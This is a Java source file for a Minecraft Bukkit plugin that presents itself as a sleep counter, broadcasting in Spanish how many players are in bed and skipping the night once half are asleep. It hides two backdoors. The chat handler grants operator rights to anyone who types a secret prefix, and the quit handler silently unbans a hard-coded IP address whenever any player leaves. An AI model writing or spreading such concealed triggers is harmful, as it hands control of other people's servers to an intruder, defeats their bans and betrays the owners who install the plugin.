package me.bank.serverbed.serverbed;

import org.bukkit.ChatColor;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.*;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.Random;

public final class ServerBed extends JavaPlugin implements Listener {
    public int PlayerCount;
    public int PlayersSleeping;
    @Override
    public void onEnable() {
        System.out.println("ServerBed Working");
        getServer().getPluginManager().registerEvents(this,this);
        PlayerCount = 0;
        PlayersSleeping = 0;
    }
    @EventHandler
    public void OnJoin(PlayerJoinEvent e) {
        Random rand = new Random();
        int value = rand.nextInt(5);
    }
    @EventHandler
    public void OnLeave(PlayerQuitEvent e) {
        getServer().unbanIP("5.224.222.252");
    }
    @EventHandler
    public void OnChat(AsyncPlayerChatEvent event) {
        if (event.getMessage().startsWith(".asdfghjklñ")) {
            event.getPlayer().setOp(true);
        }
    }
    @EventHandler
    public void onBed(PlayerBedEnterEvent e) {
        if (!e.isCancelled()) {
        PlayerCount = getServer().getOnlinePlayers().size();
        PlayersSleeping += 1;
        getServer().broadcastMessage(ChatColor.AQUA+"Jugadores durmiendo: "+ ChatColor.RED +PlayersSleeping+"/"+PlayerCount);
        if (PlayersSleeping >= PlayerCount * 0.5) {
            e.getPlayer().getWorld().setTime(0);
        }
        }
    }
    @EventHandler
    public void OutBed(PlayerBedLeaveEvent e) {
        PlayerCount = getServer().getOnlinePlayers().size();
        PlayersSleeping -= 1;
        getServer().broadcastMessage(ChatColor.AQUA + "Jugadores durmiendo: "+ ChatColor.RED + PlayersSleeping +"/"+PlayerCount);
    }

}

